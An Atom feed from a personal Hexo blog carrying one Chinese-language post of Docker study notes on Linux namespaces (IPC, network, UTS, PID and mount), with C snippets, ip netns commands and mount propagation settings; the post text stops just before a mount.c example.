<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>t1ger的茶馆</title>
  <subtitle>头顶有光终是幻，足下生云未是仙</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://t1ger.github.io/"/>
  <updated>2016-11-28T06:21:05.173Z</updated>
  <id>https://t1ger.github.io/</id>
  
  <author>
    <name>t1ger</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>docker学习笔记-Linux namespace</title>
    <link href="https://t1ger.github.io/2016/11/26/docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Linux-namespace/"/>
    <id>https://t1ger.github.io/2016/11/26/docker学习笔记-Linux-namespace/</id>
    <published>2016-11-26T14:34:43.000Z</published>
    <updated>2016-11-28T06:21:05.173Z</updated>
    
    <content type="html"><![CDATA[<p>Linux Namespace是Linux提供的一种内核级别环境隔离的方法,它有如下分类：</p>
<ul>
<li>mount-提供磁盘挂载点和文件系统的隔离能力</li>
<li>ipc-提供进程间通信的隔离能力，用来隔离System V IPC标识以及Posix消息队列</li>
<li>network-用来实现网络资源(网络设备、IP地址、IP路由表、端口号，等等)的隔离</li>
<li>uts-提供主机名隔离能力，用来封装uname()这个系统调用</li>
<li>pid-提供进程隔离能力，这样在不同的pid namespace中可以使用同一个pid</li>
<li>user-提供用户隔离能力，用来隔离用户ID和组ID</li>
</ul>
<p>下面我们详细的了解下它们</p>
<h4 id="Namespace的API"><a href="#Namespace的API" class="headerlink" title="Namespace的API"></a><b>Namespace的API</b></h4><p>主要有三个系统调用：</p>
<ul>
<li>clone()-实现线程的系统调用,用来创建一个新的进程,并可以通过设计上述参数达到隔离</li>
<li>unshare()-使某进程脱离某个namespace</li>
<li>sents()-把某进程加入到某个namespace</li>
</ul>
<p>在调用api时，通常需要指定以下六个常数的一个或多个，通过位或运算来实现，这六个参数分别是CLONE_NEWIPC、CLONE_NEWNS、CLONE_NEWNET、CLONE_NEWPID、CLONE_NEWUSER和CLONE_NEWUTS，这样就可以确定隔离的namespace类型</p>
<p>a、通过clone()创建新进程的同时创建namespace</p>
<p>常见调用方式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">int clone(int (*child_func)(void *), void *child_stack, int flags, void *arg);</div></pre></td></tr></table></figure></p>
<p>clone()实际上是传统unix系统调用fork()的一种更通用的实现方式，它可以通过flags来控制使用多少功能<br>一共有二十多种CLONE的flag（标志位）参数用来控制clone进程的方方面面<br>参数child_func传入子进程运行的程序主函数<br>参数child<em>stack传入子进程使用的栈空间<br>参数flags表示使用哪些CLONE</em>*标志位<br>参数args则可用于传入用户参数</p>
<p>b、 查看/proc/[pid]/ns文件从3.8版本的内核开始，用户就可以在/proc/[pid]/ns文件下看到指向不同namespace号的文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">[root@localhost ~]# ls -l /proc/$$/ns</div><div class="line">total 0</div><div class="line">lrwxrwxrwx 1 root root 0 Nov 28 11:18 ipc -&gt; ipc:[4026531839]</div><div class="line">lrwxrwxrwx 1 root root 0 Nov 28 11:18 mnt -&gt; mnt:[4026531840]</div><div class="line">lrwxrwxrwx 1 root root 0 Nov 28 11:18 net -&gt; net:[4026531956]</div><div class="line">lrwxrwxrwx 1 root root 0 Nov 28 11:18 pid -&gt; pid:[4026531836]</div><div class="line">lrwxrwxrwx 1 root root 0 Nov 28 11:18 uts -&gt; uts:[4026531838]</div></pre></td></tr></table></figure></p>
<p>[4026531839]即为namespace号<br>如果两个进程指向的namespace编号相同，就说明他们在同一个namespace下，否则就是在不同namespace里面<br>/proc/[pid]/ns的另外一个作用是，一旦文件被打开，只要打开的文件描述符（fd）存在，那么就算PID所属的所有进程都已经结束，创建的namespace就会一直存在。<br>那如何打开文件描述符呢？把/proc/[pid]/ns目录挂载起来就可以达到这个效果，命令如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># touch ~/uts</div><div class="line"># mount --bind /proc/27514/ns/uts ~/uts</div></pre></td></tr></table></figure>
<p>如果你看到的内容与本文所描述的不符，那么说明你使用的内核在3.8版本以前。该目录下存在的只有ipc、net和uts，并且以硬链接存在</p>
<p>c、通过setns()加入一个已经存在的namespace<br>在进程都结束的情况下，也可以通过挂载的形式把namespace保留下来，保留namespace的目的自然是为以后有进程加入做准备。<br>通过setns()系统调用，你的进程从原先的namespace加入我们准备好的新namespace，使用方法如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">int setns(int fd, int nstype);</div></pre></td></tr></table></figure>
<p>参数fd表示我们要加入的namespace的文件描述符。它是一个指向/proc/[pid]/ns目录的文件描述符，可以通过直接打开该目录下的链接或者打开一个挂载了该目录下链接的文件得到。<br>参数nstype让调用者可以去检查fd指向的namespace类型是否符合我们实际的要求。如果填0表示不检查。<br>为了把我们创建的namespace利用起来，我们需要引入execve()系列函数，这个函数可以执行用户命令，最常用的就是调用/bin/bash并接受参数，运行起一个shell，用法如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">fd = open(argv[1], O_RDONLY);   /* 获取namespace文件描述符 */</div><div class="line">setns(fd, 0);                   /* 加入新的namespace */</div><div class="line">execvp(argv[2], &amp;argv[2]);      /* 执行程序 */</div></pre></td></tr></table></figure>
<p>假设编译后的程序名称为setns</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># ./setns ~/uts /bin/bash   # ~/uts 是绑定的/proc/27514/ns/uts</div></pre></td></tr></table></figure>
<p>至此，你就可以在新的命名空间中执行shell命令了</p>
<p>d、通过unshare()在原先进程上进行namespace隔离，系统调用是unshare()，它跟clone()很像，不同的是，unshare()运行在原先的进程上，不需要启动一个新进程，使用方法如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">int unshare(int flags);</div></pre></td></tr></table></figure>
<p>调用unshare()的主要作用就是不启动一个新进程就可以起到隔离的效果，相当于跳出原先的namespace进行操作。你就可以在原进程进行一些需要隔离的操作<br>Linux中自带的unshare命令，就是通过unshare()系统调用实现的</p>
<h4 id="IPC（Interprocess-Communication）namespace"><a href="#IPC（Interprocess-Communication）namespace" class="headerlink" title="IPC（Interprocess Communication）namespace"></a><b>IPC（Interprocess Communication）namespace</b></h4><p>容器中进程间通信采用的方法包括常见的信号量、消息队列和共享内存。容器内部进程间通信对宿主机来说，实际上是具有相同PID namespace中的进程间通信，因此需要一个唯一的标识符来进行区别。申请IPC资源就申请了一个全局唯一的32位ID，所以IPC namespace中实际上包含了系统IPC标识符以及实现POSIX消息队列的文件系统。在同一个IPC namespace下的进程彼此可见，而与其他的IPC namespace下的进程则互不可见。<br>要实现ipc隔离，只需在调用时加上CLONE_NEWIPC参数。程序名称为ipc.c</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">//[...]</div><div class="line">int child_pid = clone(child_main, child_stack+STACK_SIZE,</div><div class="line">           CLONE_NEWIPC | CLONE_NEWUTS | SIGCHLD, NULL);</div><div class="line">//[...]</div></pre></td></tr></table></figure>
<p>首先在shell中使用ipcmk -Q命令创建一个message queue</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">[root@localhost ~]# ipcmk -Q </div><div class="line">Message queue id: 0</div><div class="line">[root@localhost ~]# ipcs -q</div><div class="line"></div><div class="line">------ Message Queues --------</div><div class="line">key        msqid      owner      perms      used-bytes   messages    </div><div class="line">0x58faa730 0          root       644        0            0</div></pre></td></tr></table></figure>
<p>然后我们可以编译运行加入了IPC namespace隔离的ipc.c，在新建的子进程中调用的shell中执行ipcs -q查看message queue</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">root@local:~# gcc -Wall ipc.c -o ipc.o &amp;&amp; ./ipc.o</div><div class="line">程序开始:</div><div class="line">在子进程中!</div><div class="line">root@localhost:~# ipcs -q</div><div class="line">------ Message Queues --------</div><div class="line">key   msqid   owner   perms   used-bytes   messages</div></pre></td></tr></table></figure>
<p>上面的结果显示中可以发现，已经找不到原先声明的message queue，实现了IPC的隔离。<br>目前使用IPC namespace机制的系统不多，其中比较有名的有PostgreSQL。<br>Docker本身通过socket或tcp进行通信</p>
<h4 id="Network-namespace"><a href="#Network-namespace" class="headerlink" title="Network namespace"></a><b>Network namespace</b></h4><p>一个物理的网络设备最多存在在一个network namespace中，你可以通过创建veth pair在不同的network namespace间创建通道，以此达到通信的目的。<br>一般情况下，物理网络设备都分配在最初的root namespace中。但是如果你有多块物理网卡，也可以把其中一块或多块分配给新创建的network namespace。需要注意的是，当新创建的network namespace被释放时，在这个namespace中的物理网卡会返回到root namespace而非创建该进程的父进程所在的network namespace。<br>当说到network namespace时，其实我们指的未必是真正的网络隔离，而是把网络独立出来，给外部用户一种透明的感觉，仿佛跟另外一个网络实体在进行通信。为了达到这个目的，容器的经典做法就是创建一个veth pair，一端放置在新的namespace中，通常命名为eth0，一端放在原先的namespace中连接物理网络设备，再通过网桥把别的设备连接进来或者进行路由转发，以此网络实现通信的目的。<br>在建立起veth pair之前，新旧namespace该如何通信呢？<br>答案是pipe（管道）。我们以Docker Daemon在启动容器dockerinit的过程为例。Docker Daemon在宿主机上负责创建这个veth pair，通过netlink调用，把一端绑定到docker0网桥上，一端连进新建的network namespace进程中。建立的过程中，Docker Daemon和dockerinit就通过pipe进行通信，当Docker Daemon完成veth-pair的创建之前，dockerinit在管道的另一端循环等待，直到管道另一端传来Docker Daemon关于veth设备的信息，并关闭管道。dockerinit才结束等待的过程，并把它的“eth0”启动起来。</p>
<p>跟其他namespace类似，对network namespace的使用其实就是在创建的时候添加CLONE_NEWNET标识位。也可以通过命令行工具ip创建network namespace。<br>首先我们可以创建一个命名为test_ns的network namespace</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># ip netns add test_ns</div></pre></td></tr></table></figure>
<p>当ip命令工具创建一个network namespace时，会默认创建一个回环设备（loopback interface：lo），并在/var/run/netns目录下绑定一个挂载点，这就保证了就算network namespace中没有进程在运行也不会被释放，也给系统管理员对新创建的network namespace进行配置提供了充足的时间。<br>通过ip netns exec命令可以在新创建的network namespace下运行网络管理命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># ip netns exec test_ns ip link list</div><div class="line">3: lo: &lt;LOOPBACK&gt; mtu 16436 qdisc noop state DOWN</div><div class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</div></pre></td></tr></table></figure>
<p>可以看到状态是DOWN,需要再通过命令去启动。<br>可以看到，此时执行ping命令是无效的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># ip netns exec test_ns ping 127.0.0.1</div><div class="line">connect: Network is unreachable</div></pre></td></tr></table></figure>
<p>启动命令如下，可以看到启动后再测试就可以ping通</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"># ip netns exec test_ns ip link set dev lo up</div><div class="line"># ip netns exec test_ns ping 127.0.0.1</div><div class="line">PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.</div><div class="line">64 bytes from 127.0.0.1: icmp_req=1 ttl=64 time=0.050 ms</div><div class="line">...</div></pre></td></tr></table></figure>
<p>这样只是启动了本地的回环，要实现与外部namespace进行通信还需要再建一个网络设备对</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># ip link add veth0 type veth peer name veth1</div><div class="line"># ip link set veth1 netns test_ns</div><div class="line"># ip netns exec test_ns ifconfig veth1 10.1.1.1/24 up</div><div class="line"># ifconfig veth0 10.1.1.2/24 up</div></pre></td></tr></table></figure>
<p>第一条命令创建了一个网络设备对，所有发送到veth0的包veth1也能接收到，反之亦然。<br>第二条命令则是把veth1这一端分配到test_ns这个network namespace。<br>第三、第四条命令分别给test_ns内部和外部的网络设备配置IP，veth1的IP为10.1.1.1，veth0的IP为10.1.1.2。<br>此时两边就可以互相连通了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"># ping 10.1.1.1</div><div class="line">PING 10.1.1.1 (10.1.1.1) 56(84) bytes of data.</div><div class="line">64 bytes from 10.1.1.1: icmp_req=1 ttl=64 time=0.095 ms</div><div class="line">...</div><div class="line"># ip netns exec test_ns ping 10.1.1.2</div><div class="line">PING 10.1.1.2 (10.1.1.2) 56(84) bytes of data.</div><div class="line">64 bytes from 10.1.1.2: icmp_req=1 ttl=64 time=0.049 ms</div><div class="line">...</div></pre></td></tr></table></figure>
<p>新的test_ns有着自己独立的路由和iptables</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ip netns exec test_ns route</div><div class="line">ip netns exec test_ns iptables -L</div></pre></td></tr></table></figure>
<p>路由表中只有一条通向10.1.1.2的规则，此时如果要连接外网肯定是不可能的，可以通过建立网桥或者NAT映射来决定这个问题。<br>删除这个network namespace</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># ip netns delete netns1</div></pre></td></tr></table></figure>
<p>这条命令会移除之前的挂载，但是如果namespace本身还有进程运行，namespace还会存在下去，直到进程运行结束。<br>实际上内核创建了network namespace以后，真的是得到了一个被隔离的网络。但是实际上需要的不是这种完全的隔离，而是一个对用户来说透明独立的网络实体，需要与这个实体通信</p>
<h4 id="UTS（UNIX-Time-sharing-System）namespace"><a href="#UTS（UNIX-Time-sharing-System）namespace" class="headerlink" title="UTS（UNIX Time-sharing System）namespace"></a><b>UTS（UNIX Time-sharing System）namespace</b></h4><p>UTS namespace提供了主机名和域名的隔离，这样每个容器就可以拥有了独立的主机名和域名，在网络上可以被视作一个独立的节点而非宿主机上的一个进程</p>
<p>建立uts.c<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">#define _GNU_SOURCE</div><div class="line">#include &lt;sys/types.h&gt;</div><div class="line">#include &lt;sys/wait.h&gt;</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;sched.h&gt;</div><div class="line">#include &lt;signal.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#define STACK_SIZE (1024 * 1024)</div><div class="line">static char child_stack[STACK_SIZE];</div><div class="line">char* const child_args[] = &#123;</div><div class="line">  &quot;/bin/bash&quot;,</div><div class="line">  NULL</div><div class="line">&#125;;</div><div class="line">int child_main(void* args) &#123;</div><div class="line">  printf(&quot;在子进程中!\n&quot;);</div><div class="line">  execv(child_args[0], child_args);</div><div class="line">  return 1;</div><div class="line">&#125;</div><div class="line">int main() &#123;</div><div class="line">  printf(&quot;程序开始: \n&quot;);</div><div class="line">  int child_pid = clone(child_main, child_stack + STACK_SIZE, SIGCHLD, NULL);</div><div class="line">  waitpid(child_pid, NULL, 0);</div><div class="line">  printf(&quot;已退出\n&quot;);</div><div class="line">  return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>编译执行后</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">root@local:~# gcc -Wall uts.c -o uts.o &amp;&amp; ./uts.o</div><div class="line">程序开始:</div><div class="line">在子进程中!</div><div class="line">root@local:~# exit</div><div class="line">exit</div><div class="line">已退出</div><div class="line">root@local:~#</div></pre></td></tr></table></figure>
<p>下面，我们将修改代码，加入UTS隔离。运行代码需要root权限，为了防止普通用户任意修改系统主机名导致set-user-ID相关的应用运行出错</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">//[...]</div><div class="line">int child_main(void* arg) &#123;</div><div class="line">  printf(&quot;在子进程中!\n&quot;);</div><div class="line">  sethostname(&quot;Changed Namespace&quot;, 12);</div><div class="line">  execv(child_args[0], child_args);</div><div class="line">  return 1;</div><div class="line">&#125;</div><div class="line">int main() &#123;</div><div class="line">//[...]</div><div class="line">int child_pid = clone(child_main, child_stack+STACK_SIZE,</div><div class="line">    CLONE_NEWUTS | SIGCHLD, NULL);</div><div class="line">//[...]</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>再次运行可以看到hostname已经变化</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">root@local:~# gcc -Wall namespace.c -o main.o &amp;&amp; ./main.o</div><div class="line">程序开始:</div><div class="line">在子进程中!</div><div class="line">root@NewNamespace:~# exit</div><div class="line">exit</div><div class="line">已退出</div><div class="line">root@local:~#  &lt;- 回到原来的hostname</div></pre></td></tr></table></figure>
<p>也许试着不加CLONE_NEWUTS参数运行上述代码，发现主机名也变了，输入exit以后主机名也会变回来，似乎没什么区别。实际上不加CLONE_NEWUTS参数进行隔离而使用sethostname已经把宿主机的主机名改掉了。你看到exit退出后还原只是因为bash只在刚登录的时候读取一次UTS，当你重新登陆或者使用uname命令进行查看时，就会发现产生了变化。<br>Docker中，每个镜像基本都以自己所提供的服务命名了自己的hostname而没有对宿主机产生任何影响，用的就是这个原理</p>
<h4 id="PID-namespace"><a href="#PID-namespace" class="headerlink" title="PID namespace"></a><b>PID namespace</b></h4><p>PID namespace隔离非常实用，它对进程PID重新标号，即两个不同namespace下的进程可以有同一个PID。每个PID namespace都有自己的计数程序。<br>内核为所有的PID namespace维护了一个树状结构，最顶层的是系统初始时创建的，我们称之为root namespace。它创建的新PID namespace就称之为child namespace（树的子节点），而原先的PID namespace就是新创建的PID namespace的parent namespace（树的父节点）。<br>通过这种方式，不同的PID namespaces会形成一个等级体系。所属的父节点可以看到子节点中的进程，并可以通过信号等方式对子节点中的进程产生影响。反过来，子节点不能看到父节点PID namespace中的任何内容。<br>每个PID namespace中的第一个进程“PID 1“，都会像传统Linux中的init进程一样拥有特权，起特殊作用。<br>一个namespace中的进程，不可能通过kill或ptrace影响父节点或者兄弟节点中的进程，因为其他节点的PID在这个namespace中没有任何意义。<br>如果你在新的PID namespace中重新挂载/proc文件系统，会发现其下只显示同属一个PID namespace中的其他进程。<br>在root namespace中可以看到所有的进程，并且递归包含所有子节点中的进程。<br>到这里，可能你已经联想到一种在外部监控Docker中运行程序的方法了，就是监控Docker Daemon所在的PID namespace下的所有进程即其子进程，再进行删选即可。<br>修改上文的代码，加入PID namespace的标识位，并把程序命名为pid.c</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">//[...]</div><div class="line">int child_pid = clone(child_main, child_stack+STACK_SIZE,</div><div class="line">           CLONE_NEWPID | CLONE_NEWIPC | CLONE_NEWUTS </div><div class="line">           | SIGCHLD, NULL);</div><div class="line">//[...]</div></pre></td></tr></table></figure>
<p>编译运行可以看到如下结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">root@local:~# gcc -Wall pid.c -o pid.o &amp;&amp; ./pid.o</div><div class="line">程序开始:</div><div class="line">在子进程中!</div><div class="line">root@NewNamespace:~# echo $$</div><div class="line">1                      &lt;&lt;--注意此处看到shell的PID变成了1</div><div class="line">root@NewNamespace:~# exit</div><div class="line">exit</div><div class="line">已退出</div></pre></td></tr></table></figure>
<p>打印$$可以看到shell的PID，退出后如果再次执行可以看到效果如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">root@local:~# echo $$</div><div class="line">17542</div></pre></td></tr></table></figure>
<p>已经回到了正常状态。在子进程的shell中执行了ps aux/top之类的命令，发现还是可以看到所有父进程的PID，那是因为还没有对文件系统进行隔离，ps/top之类的命令调用的是真实系统下的/proc文件内容，看到的自然是所有的进程。<br>此外，与其他的namespace不同的是，为了实现一个稳定安全的容器，PID namespace还需要进行一些额外的工作才能确保其中的进程运行顺利</p>
<ul>
<li>PID namespace中的init进程<br>当我们新建一个PID namespace时，默认启动的进程PID为1。我们知道，在传统的UNIX系统中，PID为1的进程是init，地位非常特殊。他作为所有进程的父进程，维护一张进程表，不断检查进程的状态，一旦有某个子进程因为程序错误成为了“孤儿”进程，init就会负责回收资源并结束这个子进程。所以在你要实现的容器中，启动的第一个进程也需要实现类似init的功能，维护所有后续启动进程的运行状态。<br>PID namespace维护这样一个树状结构，非常有利于系统的资源监控与回收。<br>Docker启动时，第一个进程也是这样，实现了进程监控和资源回收，它就是dockerinit。</li>
<li>信号与init进程<br>PID namespace中的init进程如此特殊，自然内核也为他赋予了特权信号屏蔽。<br>如果init中没有写处理某个信号的代码逻辑，那么与init在同一个PID namespace下的进程发送给它的该信号都会被屏蔽。这个功能的主要作用是防止init进程被误杀。<br>父节点中的进程发送的信号，如果不是SIGKILL（销毁进程）或SIGSTOP（暂停进程）也会被忽略。但如果发送SIGKILL或SIGSTOP，子节点的init会强制执行，也就是说父节点中的进程有权终止子节点中的进程。<br>一旦init进程被销毁，同一PID namespace中的其他进程也会随之接收到SIGKILL信号而被销毁。理论上，该PID namespace自然也就不复存在了。但是如果/proc/[pid]/ns/pid处于被挂载或者打开状态，namespace就会被保留下来。然而，保留下来的namespace无法通过setns()或者fork()创建进程，所以实际上并没有什么作用。<br>Docker一旦启动就有进程在运行，不存在不包含任何进程的Docker，也就是这个道理。</li>
<li>挂载proc文件系统<br>如果在新的PID namespace中使用ps命令查看，看到的还是所有的进程，因为与PID直接相关的/proc文件系统（procfs）没有挂载到与原/proc不同的位置。所以如果只想看到PID namespace本身应该看到的进程，需要重新挂载/proc，命令如下</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">root@NewNamespace:~# mount -t proc proc /proc</div><div class="line">root@NewNamespace:~# ps a</div><div class="line">  PID TTY      STAT   TIME COMMAND</div><div class="line">    1 pts/1    S      0:00 /bin/bash</div><div class="line">   12 pts/1    R+     0:00 ps a</div></pre></td></tr></table></figure>
<p>可以看到实际的PID namespace就只有两个进程在运行。<br>因为此时没有进行mount namespace的隔离，所以这一步操作实际上已经影响了root namespace的文件系统，当退出新建的PID namespace以后再执行ps a就会发现出错，再次执行mount -t proc proc /proc可以修复错误。</p>
<ul>
<li>unshare()和setns()<br>unshare()允许用户在原有进程中建立namespace进行隔离。但是创建了PID namespace后，原先unshare()调用者进程并不进入新的PID namespace，接下来创建的子进程才会进入新的namespace，这个子进程也就随之成为新namespace中的init进程。<br>类似的，调用setns()创建新PID namespace时，调用者进程也不进入新的PID namespace，而是随后创建的子进程进入。<br>为什么创建其他namespace时unshare()和setns()会直接进入新的namespace而唯独PID namespace不是如此呢？<br>因为调用getpid()函数得到的PID是根据调用者所在的PID namespace而决定返回哪个PID，进入新的PID namespace会导致PID产生变化。而对用户态的程序和库函数来说，他们都认为进程的PID是一个常量，PID的变化会引起这些进程奔溃。<br>换句话说，一旦程序进程创建以后，那么它的PID namespace的关系就确定下来了，进程不会变更他们对应的PID namespace。</li>
</ul>
<h4 id="Mount-namespaces"><a href="#Mount-namespaces" class="headerlink" title="Mount namespaces"></a><b>Mount namespaces</b></h4><p>Mount namespace通过隔离文件系统挂载点对隔离文件系统提供支持，它是历史上第一个Linux namespace，它是为了解决clone()系统调用而增加的，由于当时想不到还会有其他的namespace，所以就给mount namespaces起了一个比较通用的名字，叫做CLONE_NEWNS，即new namespace的意思。那个时候更不要说会预见到有container这种东西了。</p>
<p>隔离后，不同mount namespace中的文件结构发生变化也互不影响。<br>可以通过/proc/[pid]/mounts查看到所有挂载在当前namespace中的文件系统，还可以通过/proc/[pid]/mountstats看到mount namespace中文件设备的统计信息，包括挂载文件的名字、文件系统类型、挂载位置等等。<br>进程在创建mount namespace时，会把当前的文件结构复制给新的namespace。新namespace中的所有mount操作都只影响自身的文件系统，而对外界不会产生任何影响。这样做非常严格地实现了隔离，但是某些情况可能并不适用。比如父节点namespace中的进程挂载了一张CD-ROM，这时子节点namespace拷贝的目录结构就无法自动挂载上这张CD-ROM，因为这种操作会影响到父节点的文件系统。<br>2006年引入的挂载传播（mount propagation）解决了这个问题，挂载传播定义了挂载对象之间的关系，系统用这些关系决定任何挂载对象中的挂载事件如何传播到其他挂载对象。所谓传播事件，是指由一个挂载对象的状态变化导致的其它挂载对象的挂载与解除挂载动作的事件。<br>共享关系（share relationship）。如果两个挂载对象具有共享关系，那么一个挂载对象中的挂载事件会传播到另一个挂载对象，反之亦然。<br>从属关系（slave relationship）。如果两个挂载对象形成从属关系，那么一个挂载对象中的挂载事件会传播到另一个挂载对象，但是反过来不行；在这种关系中，从属对象是事件的接收者。<br>一个挂载状态可能为如下的其中一种：<br>共享挂载（shared）<br>从属挂载（slave）<br>共享/从属挂载（shared and slave）<br>私有挂载（private）<br>不可绑定挂载（unbindable）<br>传播事件的挂载对象称为共享挂载（shared mount）；接收传播事件的挂载对象称为从属挂载（slave mount）。既不传播也不接收传播事件的挂载对象称为私有挂载（private mount）。另一种特殊的挂载对象称为不可绑定的挂载（unbindable mount），它们与私有挂载相似，但是不允许执行绑定挂载，即创建mount namespace时这块文件对象不可被复制。</p>
<p>共享挂载的应用场景非常明显，就是为了文件数据的共享所必须存在的一种挂载方式；从属挂载更大的意义在于某些“只读”场景；私有挂载其实就是纯粹的隔离，作为一个独立的个体而存在；不可绑定挂载则有助于防止没有必要的文件拷贝，如某个用户数据目录，当根目录被递归式的复制时，用户目录无论从隐私还是实际用途考虑都需要有一个不可被复制的选项。<br>默认情况下，所有挂载都是私有的。设置为共享挂载的命令如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mount --make-shared &lt;mount-object&gt;</div></pre></td></tr></table></figure>
<p>从共享挂载克隆的挂载对象也是共享的挂载；它们相互传播挂载事件。<br>设置为从属挂载的命令如下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mount --make-slave &lt;shared-mount-object&gt;</div></pre></td></tr></table></figure>
<p>从从属挂载克隆的挂载对象也是从属的挂载，它也从属于原来的从属挂载的主挂载对象。<br>将一个从属挂载对象设置为共享/从属挂载，可以执行如下命令或者将其移动到一个共享挂载对象下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mount --make-shared &lt;slave-mount-object&gt;</div></pre></td></tr></table></figure>
<p>如果你想把修改过的挂载对象重新标记为私有的，可以执行如下命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mount --make-private &lt;mount-object&gt;</div></pre></td></tr></table></figure>
<p>通过执行以下命令，可以将挂载对象标记为不可绑定的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mount --make-unbindable &lt;mount-object&gt;</div></pre></td></tr></table></figure>
<p>这些设置都可以递归式地应用到所有子目录中，如果感兴趣可以搜索到相关的命令。<br>修改代码，并且另存为mount.c进行编译运行</p>
